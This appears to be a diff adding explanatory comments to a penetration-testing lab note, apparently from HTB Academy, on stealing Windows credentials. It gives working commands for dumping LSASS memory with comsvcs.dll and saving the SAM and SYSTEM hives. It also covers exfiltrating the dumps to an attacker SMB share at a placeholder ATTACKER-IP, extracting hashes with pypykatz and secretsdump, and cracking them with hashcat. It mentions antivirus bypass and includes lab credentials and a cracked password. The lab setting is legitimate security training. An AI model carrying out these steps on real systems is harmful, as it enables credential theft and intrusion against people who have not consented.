@@ -25,11 +25,13 @@ tasklist /svc | findstr lsass
 # From PowerShell
 Get-Process lsass
 ```
+> Finds the process ID (PID) of lsass.exe. The PID changes every boot. You need it before creating the dump file with rundll32. `tasklist` works from CMD; `Get-Process` works from PowerShell.
 
 **Create dump file (replace PID):**
 ```powershell
 rundll32 C:\windows\system32\comsvcs.dll, MiniDump <LSASS-PID> C:\lsass.dmp full
 ```
+> Calls `comsvcs.dll` via `rundll32` to create a full minidump of the LSASS process. Replace `<LSASS-PID>` with the actual PID from the previous step. Requires elevated (Administrator) PowerShell. Most antivirus tools flag this — may need bypass.
 
 > **Note:** Most modern AV tools will flag/block this. May require AV bypass.
 
@@ -42,10 +44,13 @@ Use any file transfer method (SMB share, SCP, etc.):
 # Attack host — start SMB share
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/user/loot/
 ```
+> Starts a temporary SMB share called `CompData` backed by a local directory. `-smb2support` enables SMBv2, which Windows 10+ requires. The target can then copy files to `\\ATTACKER_IP\CompData`.
+
 ```cmd
 # Target — move dump to share
 move C:\lsass.dmp \\<ATTACKER-IP>\CompData
 ```
+> Transfers the dump file from the Windows target to the attack host's SMB share. Replace `<ATTACKER-IP>` with the tun0 IP address.
 
 ---
 
@@ -56,6 +61,7 @@ move C:\lsass.dmp \\<ATTACKER-IP>\CompData
 ```bash
 pypykatz lsa minidump /path/to/lsass.dmp
 ```
+> Parses the LSASS dump file on Linux. Output is grouped by section: MSV (NT hashes), WDIGEST (possibly cleartext), Kerberos (tickets), and DPAPI (master keys). Scroll through for the MSV section to get NT hashes.
 
 ### Output Sections Explained
 
@@ -84,6 +90,7 @@ pypykatz lsa minidump /path/to/lsass.dmp
 ```bash
 hashcat -m 1000 <NT-hash> /usr/share/wordlists/rockyou.txt
 ```
+> Cracks the NT hash extracted from the MSV section. `-m 1000` is NTLM. Fast to crack — even complex passwords often fall with rockyou plus a rules file.
 
 ---
 
@@ -156,6 +163,7 @@ hashcat -m 1000 <NT-hash> /usr/share/wordlists/rockyou.txt
 ```bash
 xfreerdp /v:10.129.202.149 /u:htb-student /p:'HTB_@cademy_stdnt!' /drive:share,/tmp/loot /cert:ignore +clipboard
 ```
+> Opens an RDP session and maps `/tmp/loot` as a shared drive inside the session. Inside the RDP window, the share appears as `\\tsclient\share\`. Use this to transfer files when no SMB server is available.
 > This maps `/tmp/loot` on the attack host as `\\tsclient\share\` inside the RDP session.
 
 **Step 2 — Save registry hives (admin PowerShell on target):**
@@ -163,6 +171,7 @@ xfreerdp /v:10.129.202.149 /u:htb-student /p:'HTB_@cademy_stdnt!' /drive:share,/
 reg.exe save hklm\sam C:\sam.save
 reg.exe save hklm\system C:\system.save
 ```
+> Exports the SAM and SYSTEM registry hives. Run from an elevated (Administrator) PowerShell session. Both files are needed together — SAM has the hashes, SYSTEM has the boot key to decrypt them.
 
 **Step 3 — Dump LSASS memory (admin PowerShell on target):**
 ```powershell
@@ -170,6 +179,7 @@ Get-Process lsass
 # PID was 668
 rundll32 C:\windows\system32\comsvcs.dll, MiniDump 668 C:\lsass.dmp full
 ```
+> Gets the LSASS PID, then creates the dump using comsvcs.dll. The PID (668 here) changes per boot — always look it up first. Requires elevated PowerShell.
 
 **Step 4 — Transfer files via drive redirection:**
 ```powershell
@@ -177,11 +187,13 @@ copy C:\sam.save \\tsclient\share\sam.save
 copy C:\system.save \\tsclient\share\system.save
 copy C:\lsass.dmp \\tsclient\share\lsass.dmp
 ```
+> Copies all loot files to the xfreerdp redirected drive. `\\tsclient\share\` maps to the `/tmp/loot` directory on the attack host. Files appear there immediately.
 
 **Step 5 — Dump hashes with secretsdump (attack host):**
 ```bash
 python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam /tmp/loot/sam.save -system /tmp/loot/system.save LOCAL
 ```
+> Decrypts the SAM database offline using the SYSTEM boot key. `LOCAL` prevents secretsdump from trying to connect to a remote host. Output lists all local user NT hashes.
 
 **Output:**
 ```
@@ -198,6 +210,7 @@ htb-student:1006:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06e
 echo '31f87811133bc6aaa75a536e77f64314' > /tmp/vendor.hash
 hashcat -m 1000 /tmp/vendor.hash /usr/share/wordlists/rockyou.txt
 ```
+> Isolates the Vendor account's NT hash and cracks it. Storing a single hash avoids showing results for all accounts at once. Result prints as `hash:plaintext`.
 
 **Result:** `31f87811133bc6aaa75a536e77f64314:Mic@123`
 
